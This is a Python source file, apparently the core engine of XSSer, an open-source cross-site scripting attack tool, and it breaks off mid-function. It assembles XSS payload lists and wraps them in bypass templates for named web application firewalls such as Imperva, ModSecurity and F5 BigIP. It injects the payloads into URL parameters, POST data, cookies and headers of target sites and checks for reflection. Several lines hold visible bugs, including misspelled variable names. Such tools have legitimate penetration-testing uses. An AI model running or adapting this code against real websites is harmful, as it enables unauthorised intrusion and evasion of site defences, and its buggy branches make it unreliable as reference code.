#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
$Id$

This file is part of the xsser project, http://xsser.03c8.net

Copyright (c) 2011/2018 psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, re, sys, datetime, hashlib, time, urllib, cgi, traceback, webbrowser, random
from random import randint
import core.fuzzing
import core.fuzzing.vectors
import core.fuzzing.DCP
import core.fuzzing.DOM
import core.fuzzing.HTTPsr
import core.fuzzing.heuristic
from collections import defaultdict
from itertools import islice, chain
from urlparse import parse_qs, urlparse
from core.curlcontrol import Curl
from core.encdec import EncoderDecoder
from core.options import XSSerOptions
from core.dork import Dorker
from core.crawler import Crawler
from core.imagexss import ImageInjections
from core.flashxss import FlashInjections
from core.post.xml_exporter import xml_reporting
from core.tokenhub import HubThread
from core.reporter import XSSerReporter
from core.threadpool import ThreadPool, NoResultsPending
from core.update import Updater

# set to emit debug messages about errors (0 = off).
DEBUG = 0

class xsser(EncoderDecoder, XSSerReporter):
    """
    XSSer application class
    """
    def __init__(self, mothership=None):
        self._reporter = None
        self._reporters = []
        self._landing = False
        self._ongoing_requests = 0
        self._oldcurl = []
        self._gtkdir = None
        self._webbrowser = webbrowser
        self.crawled_urls = []
        self.checked_urls = []
        self.successfull_urls = []
        self.urlmalformed = False
        self.search_engines = [] # available dorking search engines
        #self.search_engines.append('duck')
        self.search_engines.append('bing')
        #self.search_engines.append('google')
        self.search_engines.append('yahoo')
        #self.search_engines.append('yandex')
        self.user_template = None # wizard user template
        self.user_template_conntype = "GET" # GET by default

        if not mothership:
            # no mothership so *this* is the mothership
            # start the communications hub and rock on!
            self.hub = None
            self.pool = ThreadPool(0)
            self.mothership = None
            self.final_attacks = {}
        else:
            self.hub = None
            self.mothership = mothership
            self.mothership.add_reporter(self)
            self.pool = ThreadPool(0)
            self.final_attacks = self.mothership.final_attacks
            #self.pool = None

        # initialize the url encoder/decoder
        EncoderDecoder.__init__(self)

        # your unique real opponent
        self.time = datetime.datetime.now()

        # this payload comes with vector already..
        self.DEFAULT_XSS_PAYLOAD = 'XSS'

        # to be or not to be...
        self.hash_found = []
        self.hash_notfound = []

        # other hashes
        self.hashed_payload = []
        self.url_orig_hash = []

        # some counters for checker systems
        self.errors_isalive = 0
        self.next_isalive = False
        self.flag_isalive_num = 0
        
        # some controls about targets
        self.urlspoll = []

        # some statistics counters for connections
        self.success_connection = 0
        self.not_connection = 0
        self.forwarded_connection = 0
        self.other_connection = 0

	# some statistics counters for payloads
        self.xsr_injection = 0
        self.xsa_injection = 0
        self.coo_injection = 0
        self.manual_injection = 0
        self.auto_injection = 0
        self.dcp_injection = 0
        self.dom_injection = 0
        self.httpsr_injection = 0
        self.check_positives = 0
        
        # some statistics counters for injections found
        self.xsr_found = 0
        self.xsa_found = 0
        self.coo_found = 0
        self.manual_found = 0
        self.auto_found = 0
        self.dcp_found = 0
        self.dom_found = 0
        self.httpsr_found = 0
        self.false_positives = 0

	# some statistics counters for heuristic parameters
        self.heuris_backslash_found = 0
        self.heuris_une_backslash_found = 0
        self.heuris_dec_backslash_found = 0
        self.heuris_backslash_notfound = 0
        self.heuris_slash_found = 0
        self.heuris_une_slash_found = 0
        self.heuris_dec_slash_found = 0
        self.heuris_slash_notfound = 0
        self.heuris_mayor_found = 0
        self.heuris_une_mayor_found = 0
        self.heuris_dec_mayor_found = 0
        self.heuris_mayor_notfound = 0
        self.heuris_minor_found = 0
        self.heuris_une_minor_found = 0
        self.heuris_dec_minor_found = 0
        self.heuris_minor_notfound = 0
        self.heuris_semicolon_found = 0
        self.heuris_une_semicolon_found = 0
        self.heuris_dec_semicolon_found = 0
        self.heuris_semicolon_notfound = 0
        self.heuris_colon_found = 0
        self.heuris_une_colon_found = 0
        self.heuris_dec_colon_found = 0
        self.heuris_colon_notfound = 0
        self.heuris_doublecolon_found = 0
        self.heuris_une_doublecolon_found = 0
        self.heuris_dec_doublecolon_found = 0
        self.heuris_doublecolon_notfound = 0
        self.heuris_equal_found = 0
        self.heuris_une_equal_found = 0
        self.heuris_dec_equal_found = 0
        self.heuris_equal_notfound = 0

        # xsser verbosity (0 - no output, 1 - dots only, 2+ - real verbosity)
        self.verbose = 2
        self.options = None

    def __del__(self):
        if not self._landing:
            self.land()

    def get_gtk_directory(self):
        if self._gtkdir:
            return self._gtkdir
        local_path = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                  'gtk')
        if os.path.exists(local_path):
            self._gtkdir = local_path
            return self._gtkdir
        elif os.path.exists('/usr/share/xsser/gtk'):
            self._gtkdir = '/usr/share/xsser/gtk'
            return self._gtkdir

    def set_webbrowser(self, browser):
        self._webbrowser = browser

    def set_reporter(self, reporter):
        self._reporter = reporter

    def add_reporter(self, reporter):
        self._reporters.append(reporter)

    def remove_reporter(self, reporter):
        if reporter in self._reporters:
            self._reporters.remove(reporter)

    def generate_hash(self, attack_type='default'):
        """
        Generate a new hash for a type of attack.
        """
        return hashlib.md5(str(datetime.datetime.now()) + attack_type).hexdigest()

    def generate_numeric_hash(self): # 32 length as md5
        """
        Generate a new hash for numeric only XSS
        """
        newhash = ''.join(random.choice('0123456789') for i in range(32)) 
        return newhash

    def report(self, msg, level='info'):
        """
        Report some error from the application.

        levels: debug, info, warning, error
        """
        if self.verbose == 2:
            prefix = ""
            if level != 'info':
                prefix = "["+level+"] "
            print msg
        elif self.verbose:
            if level == 'error':
                sys.stdout.write("*")
            else:
                sys.stdout.write(".")
        for reporter in self._reporters:
            reporter.post(msg)
        if self._reporter:
            from twisted.internet import reactor
            reactor.callFromThread(self._reporter.post, msg)

    def set_options(self, options):
        """
        Set xsser options
        """
        self.options = options
        self._opt_request()

    def _opt_request(self):
        """
        Pass on some properties to Curl
        """
        options = self.options
        for opt in ['cookie', 'agent', 'referer',\
			'headers', 'atype', 'acred', 'acert',
			'proxy', 'ignoreproxy', 'timeout', 
                        'delay', 'tcp_nodelay', 'retries', 
                        'xforw', 'xclient', 'threads', 
                        'dropcookie', 'followred', 'fli',
                        'nohead', 'isalive', 'alt', 'altm',
                        'ald'
			]:
            if hasattr(options, opt) and getattr(options, opt):
                setattr(Curl, opt, getattr(options, opt))

    # attack functions
    def get_payloads(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
	# payloading sources
        payloads_fuzz = core.fuzzing.vectors.vectors
        payloads_dcp = core.fuzzing.DCP.DCPvectors
        payloads_dom = core.fuzzing.DOM.DOMvectors
        payloads_httpsr = core.fuzzing.HTTPsr.HTTPrs_vectors
        manual_payload = [{"payload":options.script, "browser":"[manual_injection]"}]
        # sustitute payload for hash to check false positives
        self.hashed_payload = self.generate_hash('url')
        checker_payload = [{"payload":self.hashed_payload, "browser":"[hashed_precheck_system]"}]
        # heuristic parameters
        heuristic_params = core.fuzzing.heuristic.heuristic_test
        def enable_options_heuristic(payloads):
            if options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            return payloads
        if options.fuzz:
            payloads = payloads_fuzz
            if options.dcp:
                payloads = payloads + payloads_dcp
                if options.script:
                    payloads = payloads + manual_payload
                    if options.hash:
                        payloads = checker_payload + payloads
                        if options.inducedcode:
                            payloads = payloads + payloads_httpsr
                            if options.heuristic:
                                payloads = heuristic_params + payloads
                                if options.dom:
                                    payloads = payloads + payloads_dom
                    elif options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
                        elif options.dom:
                            payloads = payloads + payloads_dom
                    elif options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
                elif options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
                        elif options.dom:
                            payloads = payloads + payloads_dom
                elif options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.script:
                payloads = payloads + manual_payload
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payaloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
            elif options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
                elif options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.dcp:
            payloads = payloads_dcp
            if options.script:
                payloads = payloads + manual_payload
                if options.hash:
                    payloads = checker_payload + payloads
                    if options.inducedcode:
                        payloads = payloads + payloads_httpsr
                        if options.heuristic:
                            payloads = heuristic_params + payloads
                            if options.dom:
                                payloads = payloads + payloads_dom
            elif options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + inducedcode
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
                    elif options.dom:
                        payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.script:
            payloads = manual_payload
            if options.hash:
                payloads = checker_payload + payloads
                if options.inducedcode:
                    payloads = payloads + payloads_httpsr
                    if options.heuristic:
                        payloads = heuristic_params + payloads
                        if options.dom:
                            payloads = payloads + payloads_dom
            elif options.inducedcode:
                payloads = payloads + payloads_httpsr
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
                elif options.dom:
                    payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    paylaods = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.inducedcode:
            payloads = payloads_httpsr
            if options.hash:
                payloads = checker_payload + payloads
                if options.heuristic:
                    payloads = heuristic_params + payloads
                    if options.dom:
                        payloads = payloads + payloads_dom
            elif options.heuristic:
                payloads = heuristic_params + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.heuristic:
            payloads = heuristic_params
            if options.hash:
                payloads = checker_payload + payloads
                if options.dom:
                    payloads = payloads + payloads_dom
            elif options.dom:
                payloads = payloads + payloads_dom
        elif options.dom:
            payloads = payloads_dom
        elif not options.fuzz and not options.dcp and not options.script and not options.hash and not options.inducedcode and not options.heuristic and not options.dom:
            payloads = [{"payload":'">PAYLOAD',
			 "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"
                         }]
        else:
            payloads = checker_payload
        return payloads

    def process_ipfuzzing(self, text):
        """
        Mask ips in given text to DWORD
        """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipDwordEncode(ip)))
        return text

    def process_ipfuzzing_octal(self, text):
        """
       	Mask ips in given text to Octal
	    """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipOctalEncode(ip)))
        return text

    def process_payloads_ipfuzzing(self, payloads):
        """
        Mask ips for all given payloads using DWORD
        """
        # ip fuzzing (DWORD)
        if self.options.Dwo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def process_payloads_ipfuzzing_octal(self, payloads):
        """
        Mask ips for all given payloads using OCTAL
        """
        # ip fuzzing (OCTAL)
        if self.options.Doo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing_octal(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def get_query_string(self):
        """
        Get the supplied query string.
        """
        if self.options.postdata:
            return self.options.postdata
        elif self.options.getdata:
            return self.options.getdata
        return ""

    def attack_url(self, url, payloads, query_string):
        """
        Attack the given url checking or not if is correct.
        """
        if self.options.nohead:
            for payload in payloads:
                self.attack_url_payload(url, payload, query_string)
        else:
            hc = Curl()
            try:
                urls = hc.do_head_check([url])
            except:
                print "Target url: (" + url + ") is malformed" + " [DISCARDED]" + "\n"
                return
            if str(hc.info()["http-code"]) in ["200", "302", "301", "401"]:
                if str(hc.info()["http-code"]) in ["301"]:
                    url = str(hc.info()["Location"])
                    payload = ""
                    query_string = ""
                elif str(hc.info()["http-code"]) in ["302"]:
                    url = url + "/"
                    payload = ""
                    query_string = ""
                self.success_connection = self.success_connection + 1
                print "\n[Info] HEAD alive check for the target: (" + url + ") is OK " + "(" + hc.info()["http-code"] + ") [AIMED]\n"
                for payload in payloads:
                    self.attack_url_payload(url, payload, query_string)
            else:
                if str(hc.info()["http-code"]) in ["405"]:
                    print "\n[Info] HEAD alive check for the target: (" + url + ") is NOT ALLOWED (" + hc.info()["http-code"] + ") [PASSING]" + "\n"                
                    self.success_connection = self.success_connection + 1
                    for payload in payloads:
                        self.attack_url_payload(url, payload, query_string)
                else:
                    self.not_connection = self.not_connection + 1
                    print "\n[Info] HEAD alive check for the target: (" + url + ") is FAILED (" + hc.info()["http-code"] + ") [DISCARDED]" + "\n"

    def get_url_payload(self, url, payload, query_string, attack_payload=None):
        """
        Attack the given url with the given payload
        """
        options = self.options
        self._ongoing_attacks = {}

        # get payload/vector
        payload_string = payload['payload'].strip()
        
        ### Anti-antiXSS exploits #### 18/02/2016  ### 
        # PHPIDS (>0.6.5) [ALL] -> 32*payload + payload
        if options.phpids065:
            payload_string = 32*payload_string + payload_string

        # PHPIDS (>0.7) [ALL] -> payload: 'svg-onload'
        if options.phpids070:
            payload_string = '<svg+onload=+"'+payload_string+'">'

        # Imperva Incapsula [ALL] -> payload: 'img onerror' + payload[DoubleURL+HTML+Unicode]
        if options.imperva:
            payload_string = '<img src=x onerror="'+payload_string+'">'

        # WebKnight (>4.1) [Chrome] payload: 'details ontoggle'
        if options.webknight:
            payload_string = '<details ontoggle='+payload_string+'>'

        # F5BigIP [Chrome+FF+Opera] payload: 'onwheel'
        if options.f5bigip:
            payload_string = '<body style="height:1000px" onwheel="'+payload_string+'">'

        # Barracuda WAF [ALL] payload: 'onwheel'
        if options.barracuda:
            payload_string = '<body style="height:1000px" onwheel="'+payload_string+'">'

        # Apache / modsec [ALL] payload: special
        if options.modsec:
            payload_string = '<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover='+payload_string+'>'

        # QuickDefense [Chrome] payload: 'ontoggle' + payload[Unicode]
        if options.quickdefense:
            payload_string = '<details ontoggle="'+payload_string+'">'

        # substitute the attack hash
        url_orig_hash = self.generate_hash('url')
        if 'XSS' in payload_string or 'PAYLOAD' in payload_string or 'VECTOR' in payload_string:
            payload_string = payload_string.replace('PAYLOAD', self.DEFAULT_XSS_PAYLOAD)
            payload_string = payload_string.replace('VECTOR', self.DEFAULT_XSS_PAYLOAD)
            hashed_payload = payload_string.replace('XSS', url_orig_hash)
        elif "1" in payload_string:
            url_orig_hash = self.generate_numeric_hash()
            hashed_payload = payload_string.replace('1', url_orig_hash) # adding numeric XSS (ex: alert('1'))
        else:
            print "\n[Error] You aren't using a valid keyword: 'XSS', '1', 'PAYLOAD', 'VECTOR'... for your --payload. Aborting...\n"
            print("="*75 + "\n") 
            sys.exit(2)

        if options.imperva:
            hashed_payload = urllib.urlencode({'':hashed_payload})
            hashed_payload = urllib.urlencode({'':hashed_payload}) #DoubleURL encoding
            hashed_payload = cgi.escape(hashed_payload) # + HTML encoding
            hashed_payload = unicode(hashed_payload) # + Unicode

        if options.quickdefense:
            hashed_payload = unicode(hashed_payload) # + Unicode

        if attack_payload:
            # url for real attack
            hashed_vector_url = self.encoding_permutations(attack_payload)
        else:
            # test
            hashed_vector_url = self.encoding_permutations(hashed_payload)

        self._ongoing_attacks['url'] = url_orig_hash

        if not options.getdata: # using GET as a single input (-u)
            target_url = url
        else:
            if not options.postdata: # using GET provided by parameter (-g)
                if not url.endswith("/") and not options.getdata.startswith("/"):
                    url = url + "/"
                target_url = url + options.getdata
        p_uri = urlparse(target_url)
        uri = p_uri.netloc
        path = p_uri.path
        if not uri.endswith('/') and not path.startswith('/'):
            uri = uri + "/"
        target_params = parse_qs(urlparse(target_url).query, keep_blank_values=True)
        if not target_params: # just an url pased (ex: -u 'http://example.com')
            payload_url = query_string.strip() + hashed_vector_url
            dest_url = p_uri.scheme + "://" + uri + path + payload_url
        else:
            for key, value in target_params.iteritems(): # parse params searching for keywords
                for v in value:
                    if v == 'XSS': # input keywords to inject payload
                        target_params[key] = hashed_vector_url
                        url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                        hashed_payload = payload_string.replace('XSS', url_orig_hash)
                        hashed_vector_url = self.encoding_permutations(hashed_payload)
                    else:
                        target_params[key] = v
            payload_url = query_string.strip() + hashed_vector_url
            target_url_params = urllib.urlencode(target_params)
            dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
        if options.postdata: # using POST provided by parameter (-p)
            target_params = parse_qs(query_string, keep_blank_values=True)
            for key, value in target_params.iteritems(): # parse params searching for keywords
                for v in value:
                    if v == 'XSS': # input keywords to inject payload
                        target_params[key] = hashed_vector_url
                        url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                        hashed_payload = payload_string.replace('XSS', url_orig_hash)
                        hashed_vector_url = self.encoding_permutations(hashed_payload)
                    else:
                        target_params[key] = v
            target_url_params = urllib.urlencode(target_params)
            dest_url = target_url_params
        return dest_url, url_orig_hash

    def attack_url_payload(self, url, payload, query_string):
        if not self.pool:
            pool = self.mothership.pool
        else:
            pool = self.pool
        c= Curl()
        def _cb(request, result):
            self.finish_attack_url_payload(c, request, result, payload,
                                           query_string, url, newhash)
        _error_cb = self.error_attack_url_payload
        def _error_cb(request, error):
            self.error_attack_url_payload(c, url, request, error)
        if self.options.getdata or not self.options.postdata:
            dest_url, newhash = self.get_url_payload(url, payload, query_string)
            if (self.options.xsa or self.options.xsr or self.options.coo):
                agent, referer, cookie = self._prepare_extra_attacks(payload) 
                c.agent = agent
                c.referer = referer
                c.cookie = cookie
            pool.addRequest(c.get, [[dest_url]], _cb, _error_cb)
            self._ongoing_requests += 1
        if self.options.postdata:
            dest_url, newhash = self.get_url_payload("", payload, query_string)
            dest_url = dest_url.strip().replace("/", "", 1)
            if (self.options.xsa or self.options.xsr or self.options.coo):
                agent, referer, cookie = self._prepare_extra_attacks(payload)
                c.agent = agent
                c.referer = referer
                c.cookie = cookie
            pool.addRequest(c.post, [[url, dest_url]], _cb, _error_cb)
            self._ongoing_requests += 1

    def error_attack_url_payload(self, c, url, request, error):
        self._ongoing_requests -= 1
        for reporter in self._reporters:
            reporter.mosquito_crashed(url, str(error[0]))
        dest_url = request.args[0]
        self.report("Failed attempt (URL Malformed!?): " + url + "\n")
        self.urlmalformed = True
        if self.urlmalformed == True and self.urlspoll[0] == url:
            self.land()
        self.report(str(error[0]))
        if DEBUG:
            traceback.print_tb(error[2])
        c.close()
        del c
        return

    def finish_attack_url_payload(self, c, request, result, payload,
                                  query_string, url, orig_hash):
        self.report('='*75)
        self.report("Target: " + url + " --> " + str(self.time))
        self.report('='*75 + "\n")
        self._ongoing_requests -= 1
        dest_url = request.args[0]
        # adding constant head check number flag
        if self.options.isalive:
            self.flag_isalive_num = int(self.options.isalive)

        if self.options.isalive <= 0:
            pass

        elif self.options.isalive and self.options.nohead:
            self.errors_isalive = self.errors_isalive + 1
            if self.errors_isalive > self.options.isalive:
                pass
            else:
                self.report("---------------------")
                self.report("Alive Checker for: " + url + " - [", self.errors_isalive, "/", self.options.isalive, "]\n")
            if self.next_isalive == True:
                hc = Curl()
                self.next_isalive = False
                try:
                    urls = hc.do_head_check([url])
                except:
                    print "Target url: (" + url + ") is unaccesible" + " [DISCARDED]" + "\n"
                    self.errors_isalive = 0
                    return
                if str(hc.info()["http-code"]) in ["200", "302", "301", "401"]:
                    print "HEAD alive check: OK" + "(" + hc.info()["http-code"] + ")\n"
                    print "- Your target still Alive: " + "(" + url + ")"
                    print "- If you are receiving continuous 404 errors requests on your injections but your target is alive is because:\n"
                    print "          - your injections are failing: normal :-)"
                    print "          - maybe exists some IPS/NIDS/... systems blocking your requests!\n"
                else:
                    if str(hc.info()["http-code"]) == "0":
                        print "\nTarget url: (" + url + ") is unaccesible" + " [DISCARDED]" + "\n"
                    else:
                        print "HEAD alive check: FAILED" + "(" + hc.info()["http-code"] + ")\n"
                        print "- Your target " + "(" + url + ")" + " looks that is NOT alive"
                        print "- If you are receiving continuous 404 errors requests on payloads\n  and this HEAD pre-check request is giving you another 404\n  maybe is because; target is down, url malformed, something is blocking you...\n- If you haven't more than one target try to; STOP THIS TEST!!\n"
                self.errors_isalive = 0
            else:
                if str(self.errors_isalive) >= str(self.options.isalive):
                    self.report("---------------------")
                    self.report("\nAlive System: XSSer is checking if your target still alive. [Waiting for reply...]\n")
                    self.next_isalive = True
                    self.options.isalive = self.flag_isalive_num
        else:
            if self.options.isalive and not self.options.nohead:
                self.report("---------------------")
                self.report("Alive System DISABLED!: XSSer is using a pre-check HEAD request per target by default to perform better accurance on tests\nIt will check if target is alive before inject all the payloads. try (--no-head) with (--alive <num>) to control this checker limit manually")
                self.report("---------------------")

        # check results an alternative url, choosing method and parameters, or not
        if self.options.altm == None or self.options.altm not in ["GET", "POST", "post"]:
            self.options.altm = "GET"
        if self.options.altm == "post":
            self.options.altm = "POST"
        if self.options.alt == None:
            pass
        else:
            self.report("="*45)
            self.report("[+] Checking Response Options:", "\n")
            self.report("[+] Url:", self.options.alt)
            self.report("[-] Method:", self.options.altm)
            if self.options.ald:
                self.report("[-] Parameter(s):", self.options.ald, "\n")
            else:
                self.report("[-] Parameter(s):", query_string, "\n")

        # perform normal injection
        if c.info()["http-code"] in ["200", "302", "301"]:
            if self.options.statistics:
                self.success_connection = self.success_connection + 1
            self._report_attack_success(c, dest_url, payload,
                                        query_string, url, orig_hash)
        else:
            self._report_attack_failure(c, dest_url, payload,
                                        query_string, url, orig_hash)

        # checking response results 
        if self.options.alt == None:
            pass
        else:
            self.report("="*45)
            self.report("[+] Checking Response Results:", "\n")
            self.report("Searching using", self.options.altm, "for:", orig_hash, "on alternative url")
            if 'PAYLOAD' in payload['payload']:
                user_attack_payload = payload['payload'].replace('PAYLOAD', orig_hash)
            if self.options.ald:
                query_string = self.options.ald
            if "VECTOR" in self.options.alt:
                dest_url = self.options.alt
            else:
                if not dest_url.endswith("/"):
                    dest_url = dest_url + "/"
            if self.options.altm == 'POST':
                dest_url = "" + query_string + user_attack_payload
                dest_url = dest_url.strip().replace("/", "", 1)
                if (self.options.xsa or self.options.xsr or self.options.coo):
                    agent, referer, cookie = self._prepare_extra_attacks(payload)
                    c.agent = agent
                    c.referer = referer
                    c.cookie = cookie
                data = c.post(url, dest_url)
            else:
                dest_url = self.options.alt + query_string + user_attack_payload
                if (self.options.xsa or self.options.xsr or self.options.coo):
                    agent, referer, cookie = self._prepare_extra_attacks(payload)
                    c.agent = agent
                    c.referer = referer
                    c.cookie = cookie
                c.get(dest_url)

        # perform check response injection
            if c.info()["http-code"] in ["200", "302", "301"]:
                if self.options.statistics:
                    self.success_connection = self.success_connection + 1
                self._report_attack_success(c, dest_url, payload,
                                            query_string, url, orig_hash)
            else:
                self._report_attack_failure(c, dest_url, payload,
                                            query_string, url, orig_hash)
 
        c.close()
        del c

    def encoding_permutations(self, enpayload_url):
        """
        Perform encoding permutations on the url and query_string.
        """
        options = self.options
        if options.Cem: 
            enc_perm = options.Cem.split(",")
            for _enc in enc_perm:
                enpayload_url   = self.encmap[_enc](enpayload_url)
        else: 
            for enctype in self.encmap.keys():
                if getattr(options, enctype):
                    enpayload_url   = self.encmap[enctype](enpayload_url)
        return enpayload_url

    def _report_attack_success(self, curl_handle, dest_url, payload,\
                               query_string, orig_url, url_orig_hash):
        """
        report success of an attack
        """
        if not orig_url in self.successfull_urls:
            self.successfull_urls.append(orig_url)
        options = self.options
        self.report("-"*45)
        if payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]" or payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[-] Hashing: " + url_orig_hash)
        if payload['browser'] == "[Heuristic test]":
            self.report("[+] Checking: " + str(payload['payload']).strip('XSS'))
        else:
            if options.postdata:
                self.report("[+] Trying: " + dest_url.strip(), "(POST:", query_string + ")")
            else:
                self.report("[+] Trying: " + urllib.unquote(dest_url.strip()))
        if payload['browser'] == "[Heuristic test]" or payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]":
            pass
        else:
            self.report("[+] Browser Support: " + payload['browser'])
        
	# statistics injections counters
        if payload['browser']=="[hashed_precheck_system]" or payload['browser']=="[Heuristic test]":
            self.check_positives = self.check_positives + 1
        elif payload['browser']=="[Data Control Protocol Injection]":
            self.dcp_injection = self.dcp_injection + 1
        elif payload['browser']=="[Document Object Model Injection]":
            self.dom_injection = self.dom_injection + 1
        elif payload['browser']=="[Induced Injection]":
            self.httpsr_injection = self.httpsr_injection + 1
        elif payload['browser']=="[manual_injection]":
            self.manual_injection = self.manual_injection + 1
        else:
            self.auto_injection = self.auto_injection +1

        if options.verbose:
            self.report("[-] Headers Results:\n")
            self.report(curl_handle.info())
            # if you need more data about your connection(s), uncomment this two lines:
            #self.report("[-] Body Results:\n")
            #self.report(curl_handle.body())
            self.report("-"*45)
        
            if payload['browser']=="[Heuristic test]":
                pass
            else:
                self.report("[-] Injection Results:")

        # check attacks success
        for attack_type in self._ongoing_attacks:
            hashing = url_orig_hash
            # checking heuristic responses
            if payload['browser']=="[Heuristic test]":
                heuristic_param = str(payload['payload']).strip('XSS')
                heuristic_string = str(hashing)
                if heuristic_string in curl_handle.body():
                    # ascii
                    if heuristic_param == "\\":
                        self.heuris_backslash_found = self.heuris_backslash_found + 1
                    # / is the same on ASCII and Unicode
                    elif heuristic_param == "/":
                        self.heuris_slash_found = self.heuris_slash_found + 1
                        self.heuris_une_slash_found = self.heuris_une_slash_found + 1
                    elif heuristic_param == ">":
                        self.heuris_mayor_found = self.heuris_mayor_found + 1
                    elif heuristic_param == "<":
                        self.heuris_minor_found = self.heuris_minor_found + 1
                    elif heuristic_param == ";":
                        self.heuris_semicolon_found = self.heuris_semicolon_found + 1
                    elif heuristic_param == "'":
                        self.heuris_colon_found = self.heuris_colon_found + 1
                    elif heuristic_param == '"':
                        self.heuris_doublecolon_found = self.heuris_doublecolon_found + 1
                    elif heuristic_param == "=":
                        self.heuris_equal_found = self.heuris_equal_found + 1
                    # une
                    elif heuristic_param == "%5C":
                        self.heuris_une_backslash_found = self.heuris_une_backslash_found + 1
                    elif heuristic_param == "%3E":
                        self.heuris_une_mayor_found = self.heuris_une_mayor_found + 1
                    elif heuristic_param == "%3C":
                        self.heuris_une_minor_found = self.heuris_une_minor_found + 1
                    elif heuristic_param == "%3B":
                        self.heuris_une_semicolon_found = self.heuris_une_semicolon_found + 1
                    elif heuristic_param == "%27":
                        self.heuris_une_colon_found = self.heuris_une_colon_found + 1
                    elif heuristic_param == "%22":
                        self.heuris_une_doublecolon_found = self.heuris_une_doublecolon_found + 1
                    elif heuristic_param == "%3D":
                        self.heuris_une_equal_found = self.heuris_une_equal_found + 1
                    # dec
                    elif heuristic_param == "&#92":
                        self.heuris_dec_backslash_found = self.heuris_dec_backslash_found + 1
                    elif heuristic_param == "&#47":
                        self.heuris_dec_slash_found = self.heuris_dec_slash_found + 1
                    elif heuristic_param == "&#62":
                        self.heuris_dec_mayor_found = self.heuris_dec_mayor_found + 1
                    elif heuristic_param == "&#60":
                        self.heuris_dec_minor_found = self.heuris_dec_minor_found + 1
                    elif heuristic_param == "&#59":
                        self.heuris_dec_semicolon_found = self.heuris_dec_semicolon_found + 1
                    elif heuristic_param == "&#39":
                        self.heuris_dec_colon_found = self.heuris_dec_colon_found + 1
                    elif heuristic_param == "&#34":
                        self.heuris_dec_doublecolon_found = self.heuris_dec_doublecolon_found + 1
                    elif heuristic_param == "&#61":
                        self.heuris_dec_equal_found = self.heuris_dec_equal_found + 1	
